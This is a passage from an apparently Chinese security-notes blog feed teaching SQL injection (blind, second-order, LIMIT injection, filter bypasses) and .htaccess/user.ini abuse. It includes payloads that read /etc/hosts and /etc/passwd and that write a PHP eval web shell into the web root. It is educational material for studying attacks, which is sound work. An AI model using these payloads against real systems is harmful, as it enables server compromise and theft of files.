&lt;p&gt;hex()&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;如果N_or_S是一个数字，返回N，其中N是一个长长&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;BIGINT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;数字的十六进制值的字符串表示。这等同于CONV&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;N，&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;。

	如果N_or_S是一个字符串，返回N_or_S在N_or_S每个字符被转化为两个十六进制数字的十六进制字符串表示。

									
									
									&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;adsbygoogle &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; window&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;adsbygoogle &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;push&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&amp;#123;&amp;#125;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
									
									
									
									&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;adsbygoogle &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; window&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;adsbygoogle &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;push&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&amp;#123;&amp;#125;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
									&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; HEX&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;255&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;---------------------------------------------------------+&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; HEX&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;255&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;                                                &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;---------------------------------------------------------+&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; FF                                                      &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;---------------------------------------------------------+&lt;/span&gt;
&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;row&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.00&lt;/span&gt; sec&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x616263&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;---------------------------------------------------------+&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x616263&lt;/span&gt;                                                &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;---------------------------------------------------------+&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; abc                                                     &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;---------------------------------------------------------+&lt;/span&gt;
&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;row&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.00&lt;/span&gt; sec&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;比较函数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;if()&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;语法结构：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;if(expr1,expr2,expr3)&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;上述语法结构中 expr1 表示的是判断条件，expr2 和 expr3 是符合 expr1 的自定义的返回结果&lt;/p&gt;
&lt;p&gt;当 expr1 的值为真时，则返回值为 expr2；当 expr1 的值为假时，则返回值为 expr3&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;时间盲注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#时间盲注&#34;&gt;#&lt;/a&gt; 时间盲注&lt;/h2&gt;
&lt;p&gt;时间盲注出现的原因也是因为服务器端拼接了失去了语句但是所有的回显都被过滤，我们只能通过页面的响应时间做一个判断但是由于 sleep 和 benchmark 函数的大量执行会使得服务器的负载高，容易导致题目挂掉。&lt;/p&gt;
&lt;p&gt;做题的方法和 bool 盲注差不多，判断的方式不同，一般时间盲注常用的有两个函数 sleep 和 benchmark 函数如下表&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;函数名&lt;/th&gt;
&lt;th&gt;功能和使用方法&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;sleep()&lt;/td&gt;
&lt;td&gt;sleep 是睡眠函数，可以使得查询数据的时候回显数据的响应时间延长，使用方法 sleep (N) 这里 N 是延长的时间，常配合 if 使用：&amp;lt;br /&amp;gt;if (ascll (subster (user (),1,1))=114,sleep (5),2)&amp;lt;br /&amp;gt; 这样绕过 user 的第一位的 ascll 为 114 则页面返回时间延迟 5 秒&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;benchmark()&lt;/td&gt;
&lt;td&gt;benchmark 函数原本是用来重复执行某条语句的函数，我们可以利用这个函数来测试数据库的读写性能使用方法：&amp;lt;br /&amp;gt;benchmark (N，expression)&amp;lt;br /&amp;gt; 其中 N 为执行次数，expression 为表达式。如果需要进行盲注，我们通常遇需要运算时间的计算配合使用比如 MD5&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;二次注入-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二次注入-2&#34;&gt;#&lt;/a&gt; 二次注入&lt;/h2&gt;
&lt;p&gt;二次注入的成因是第一次入库时经过了一些转义，但是存入数据库后会去除转义，导致第二次使用时恶意构造 sql 语句&lt;/p&gt;
&lt;h2 id=&#34;limit之后的注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#limit之后的注入&#34;&gt;#&lt;/a&gt; limit 之后的注入&lt;/h2&gt;
&lt;p&gt;mysql 数据库 &amp;gt; 5.0、mysql 数据库 &amp;lt; 5.6.6 可以在 limit 部分进行注入&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;select field from table where id &amp;gt; 0 order by id limit &amp;#123;injection_point&amp;#125;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;也可以使用如下的 payload 进行注入：&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;select firld from user where id &amp;gt; 0 order by id limit 1,1 procedure analyse(extractractvalue(rand(),concat(0x3a,version())),1);&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;h2 id=&#34;注入点的发现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注入点的发现&#34;&gt;#&lt;/a&gt; 注入点的发现&lt;/h2&gt;
&lt;h3 id=&#34;常见的注入点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见的注入点&#34;&gt;#&lt;/a&gt; 常见的注入点&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;GET 参数&lt;/li&gt;
&lt;li&gt;POST 参数&lt;/li&gt;
&lt;li&gt;UA 头&lt;/li&gt;
&lt;li&gt;Cookie&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;判断注入点存在&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#判断注入点存在&#34;&gt;#&lt;/a&gt; 判断注入点存在&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;插入单引号&lt;/li&gt;
&lt;li&gt;数字型判断&lt;/li&gt;
&lt;li&gt;通过数字的加减判断&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过&#34;&gt;#&lt;/a&gt; 绕过&lt;/h2&gt;
&lt;h3 id=&#34;过滤关键字&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过滤关键字&#34;&gt;#&lt;/a&gt; 过滤关键字&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;大小写&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221008001157452.png&#34; alt=&#34;image-20221008001157452&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;双写（替换为空时使用）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221008001212446.png&#34; alt=&#34;image-20221008001212446&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;16 进制绕过&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221008001254934.png&#34; alt=&#34;image-20221008001254934&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;url 编码绕过（必要时可以通过双重 url 编码饶过）&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;过滤空格&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过滤空格&#34;&gt;#&lt;/a&gt; 过滤空格&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;通过注释符绕过
&lt;ul&gt;
&lt;li&gt;
&lt;h1 id=&#34;&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#&#34;&gt;#&lt;/a&gt; &lt;/h1&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;//&lt;/li&gt;
&lt;li&gt;/**/&lt;/li&gt;
&lt;li&gt;;%00&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;url 编码（双重）&lt;/li&gt;
&lt;li&gt;换行绕过&lt;/li&gt;
&lt;li&gt;特殊符号（引号）&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;过滤单引号&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过滤单引号&#34;&gt;#&lt;/a&gt; 过滤单引号&lt;/h3&gt;
&lt;p&gt;这里是指魔术引号，可以通过宽字节绕过&lt;/p&gt;
&lt;h2 id=&#34;sql读写文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql读写文件&#34;&gt;#&lt;/a&gt; sql 读写文件&lt;/h2&gt;
&lt;p&gt;在 mysql 用户拥有 file 权限的时候可以使用 load_file 和 into outfile/dumpfile 进行读写&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;eg：有sql语句
select username from user id&amp;#x3D;$id
我们可以构建度文件
?id&amp;#x3D;-1 union select load_file(&amp;#39;&amp;#x2F;ect&amp;#x2F;hosts&amp;#39;)
如果有单引号过滤，还可以对文件名十六进制
?id&amp;#x3D;-1 union select load_file(0x2f6563742f686f737473)
&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;也可以写文件&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&amp;lt;?php eval($_post[1]);?&gt;&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;into&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;outfile&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/var/www/html/shell.php&#39;&lt;/span&gt;
或者
?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; unhex&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;一句话的&lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;进制&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;into&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;outfile&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/var/www/html/shell.php&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
</content>
        <updated>2022-10-23T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>https://blog.xcu.icu/2022/10/24/user.ini%E5%92%8Chtaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/</id>
        <title>user.ini和htaccess文件的利用</title>
        <link rel="alternate" href="https://blog.xcu.icu/2022/10/24/user.ini%E5%92%8Chtaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/"/>
        <content type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&#34;htaccess文件的利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#htaccess文件的利用&#34;&gt;#&lt;/a&gt; .htaccess 文件的利用&lt;/h2&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9saW5rLmppYW5zaHUuY29tLz90PWh0dHA6Ly9odGFjY2Vzcy51dXouY2MvI2FfV1dX&#34;&gt;自动生成.htaccess 的网站&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;分布式配置文件，它里面存放着 apache 服务器配置相关命令，提供了针对目录改变配置的方法，作用范围是当前目录及其子目录&lt;/p&gt;
&lt;p&gt;使用前，首先要启用 htacces，将 AllowOveride 的配置改为 all&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;AllowOverride 从字面上解释是允许覆盖的意思，即 Apache 允许另一配置文件覆盖现有配置文件。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在 AllowOverride 设置为 None 时， .htaccess 文件将被完全忽略。当此指令设置为 All 时，所有具有 “.htaccess” 作用域的指令都允许出现在 .htaccess 文件中。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221019211017128.png&#34; alt=&#34;image-20221019211017128&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;问题点一&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#问题点一&#34;&gt;#&lt;/a&gt; 问题点一&lt;/h3&gt;
&lt;p&gt;PHPStudy 中 AddType application/x-httpd-php 等 Apache 命令之所以在 Apache 的设置文件中设置后未实现目标效果是由于 PHP 的版本不符导致的，但注意这里的 PHP 版本并不是指 PHP7.3.0、PHP7.4.0 这种版本号，也不是适用于 32 位的 PHP、适用于 64 位的 PHP 这种不同机型的版本，而&lt;strong&gt;是 PHP 的 NTS (Non Thread Safe) 与 TS (Thread Safe) 的这种不同版本导致的&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93aW5kb3dzLnBocC5uZXQvZG93bmxvYWQv&#34;&gt;PHP For Windows: Binaries and sources Releases&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221019230226348.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;ts(Thread-Safety)&lt;strong&gt; 即&lt;/strong&gt;线程安全&lt;/strong&gt;，多线程访问时，采用了加锁机制，当一个线程访问该类的某个数据时，进行保护，其他线程不能进行访问直到该线程读取完，其他线程才可使用。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;nts(None-Thread Safe)&lt;strong&gt; 即&lt;/strong&gt;非线程安全&lt;/strong&gt;，就是不提供数据访问保护，有可能出现多个线程先后更改数据造成所得到的是 脏数据 php 以 fast cgi 方式运行的时候选择这个版本，具有更好的性能；&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;解决办法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#解决办法&#34;&gt;#&lt;/a&gt; 解决办法&lt;/h4&gt;
&lt;p&gt;安装 TS 版本的 php，在 apache 配置中设置好&lt;/p&gt;
&lt;p&gt;在 php 文件夹中将 php.ini-development 文件复制一份命名为 php.ini&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221019234241421.png&#34; alt=&#34;image-20221019234241421&#34; /&gt;&lt;/p&gt;
&lt;p&gt;新下载的 php 本来没有现成的 php.ini 文件。只是给了&lt;/p&gt;
&lt;p&gt;php.ini-development （开发环境用）与 php.ini-production（生产环境用）两个建议。&lt;/p&gt;
&lt;p&gt;而 php 去加载 php.ini 作为配置文件的。我们更喜欢哪个建议，就把它备份，然后重命名为 php.ini 然后加入自己个性化的配置即可。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221019234518254.png&#34; alt=&#34;image-20221019234518254&#34; /&gt;&lt;/p&gt;
&lt;p&gt;打开 php.ini，找到 extension_dir，并把前面的 &amp;quot;;&amp;quot; 符号删掉 (在 php.ini 相当于注释符)，其值改为 &amp;quot;PHP 文件的路径 /ext&amp;quot;。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221019234918061.png&#34; alt=&#34;image-20221019234918061&#34; /&gt;&lt;/p&gt;
&lt;p&gt;他是放 php 扩展的目录，保存后，我们 PHP 就设置完成了，接下来要设置 Apache。&lt;/p&gt;
&lt;p&gt;来到 PHPStudy 安装 Apache 的目录下，打开 Apache 的配置文件 httpd.conf, 搜索 LoadModule，找到有很多 LoadModule 语句的地方。( &lt;strong&gt;LoadModule：加载特定的 DSO 模块。&lt;/strong&gt;)&lt;/p&gt;
&lt;p&gt;在末尾加上 LoadModule php7_module &amp;quot;PHP 文件的路径 /php7apache2_4.dll&amp;quot; 和 PHPIniDir &amp;quot;PHP 文件的路径&amp;quot;。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221019235835759.png&#34; alt=&#34;image-20221019235835759&#34; /&gt;&lt;/p&gt;
&lt;p&gt;再加上一句 AddType application/x-httpd-php .php，配置就完成了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221020000146394.png&#34; alt=&#34;image-20221020000146394&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用&#34;&gt;#&lt;/a&gt; 利用&lt;/h3&gt;
&lt;h5 id=&#34;文件解析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件解析&#34;&gt;#&lt;/a&gt; 文件解析&lt;/h5&gt;
&lt;p&gt;首先还是先说文件上传中常用的利用方式&lt;/p&gt;
&lt;p&gt;(8.* 无法使用)&lt;/p&gt;
&lt;p&gt;在 htaccess 文件中写入如下内容，上传到服务端后再上传一个其他任意后缀的文件，都会被当作 php 文件解析&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-htaccess&#34; data-language=&#34;htaccess&#34;&gt;&lt;code class=&#34;language-htaccess&#34;&gt;&amp;lt;FilesMatch “.png”&amp;gt;
SetHandler application&amp;#x2F;x-httpd-php
&amp;lt;&amp;#x2F;FilesMatch&amp;gt;
#匹配文件中有haha存在
SetHandler application&amp;#x2F;x-httpd-php
#SetHandler强制所有匹配的文件由指定处理程序处理
AddType application&amp;#x2F;x-httpd-php .txt
#AddType将给定的文件扩展名映射到指定的内容类型&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221020180621597.png&#34; alt=&#34;image-20221020180621597&#34; /&gt;&lt;/p&gt;
&lt;p&gt;接着聊一聊别的利用方式&lt;/p&gt;
&lt;h5 id=&#34;源码泄露&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#源码泄露&#34;&gt;#&lt;/a&gt; 源码泄露&lt;/h5&gt;
&lt;p&gt;当使用 PHP 作为 Apache 模块时，也可以用 Apache 的配置文件（例如 httpd.conf）和 .htaccess 文件中的指令来修改 php 的配置设定&lt;/p&gt;
&lt;p&gt;我们可以通过 .htaccess 文件的 php_value 指令对 PHP 的 engine 配置选项进行设定，当把 engine 的值设为 off（或 0）时可以禁用一个本目录和子目录中的 PHP 解析，此时将会造成源码泄露：&lt;/p&gt;
&lt;p&gt;在 htaccess 文件中写入&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-htaccess&#34; data-language=&#34;htaccess&#34;&gt;&lt;code class=&#34;language-htaccess&#34;&gt;php_value engine 0&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221020210713349.png&#34; alt=&#34;image-20221020210713349&#34; /&gt;&lt;/p&gt;
&lt;h5 id=&#34;文件包含&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件包含&#34;&gt;#&lt;/a&gt; 文件包含&lt;/h5&gt;
&lt;p&gt;htaccess 文件中同样有两个配置 auto_prepend_file 和 auto_append_file，我们可以通过 php_value 来设置，条件是同级目录下有 php 文件&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-htaccess&#34; data-language=&#34;htaccess&#34;&gt;&lt;code class=&#34;language-htaccess&#34;&gt;php_value auto_append_file &amp;#x2F;etc&amp;#x2F;passwd&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221020211527232.png&#34; alt=&#34;image-20221020211527232&#34; /&gt;&lt;/p&gt;
&lt;h5 id=&#34;防御&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御&#34;&gt;#&lt;/a&gt; 防御&lt;/h5&gt;
&lt;p&gt;最直接的就是过滤 htaccess 后缀&lt;/p&gt;
&lt;p&gt;对文件重命名（htaccess 文件命名固定）&lt;/p&gt;
&lt;h2 id=&#34;userini的利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#userini的利用&#34;&gt;#&lt;/a&gt; user.ini 的利用&lt;/h2&gt;
&lt;p&gt;php.ini 是 php 的全局配置文件，只要是以 fastcgi 运行的 php 都可以用这个方法，对整个 web 环境起作用&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221018203121751.png&#34; alt=&#34;image-20221018203121751&#34; /&gt;&lt;/p&gt;
